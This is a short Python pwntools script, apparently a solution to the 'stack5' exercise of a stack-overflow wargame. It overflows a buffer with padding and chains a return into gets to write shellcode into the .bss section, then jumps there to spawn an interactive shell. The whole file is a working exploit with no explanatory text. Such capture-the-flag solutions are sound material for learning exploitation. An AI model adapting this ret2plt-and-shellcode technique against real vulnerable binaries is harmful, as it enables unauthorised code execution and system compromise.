#!/usr/bin/env python
# coding: UTF-8

from pwn import *

context(os='linux', arch='i386')
# context.log_level = 'debug'

p = process(['./stack5'])

elf = ELF('./stack5')

buf_size = 64

payload = 'A' * buf_size
payload += 'AAAA' * 3
# ret2plt       plt addr              ret addr         get arg
payload += p32(elf.plt['gets']) + p32(elf.bss()) + p32(elf.bss())
# payload += p32(elf.plt['gets']) + p32(elf.bss() + 50) + p32(elf.bss())

p.sendline(payload)
p.sendline(asm(shellcraft.sh()))
#p.sendline('\x90' * 100 + asm(shellcraft.sh()))
p.interactive()
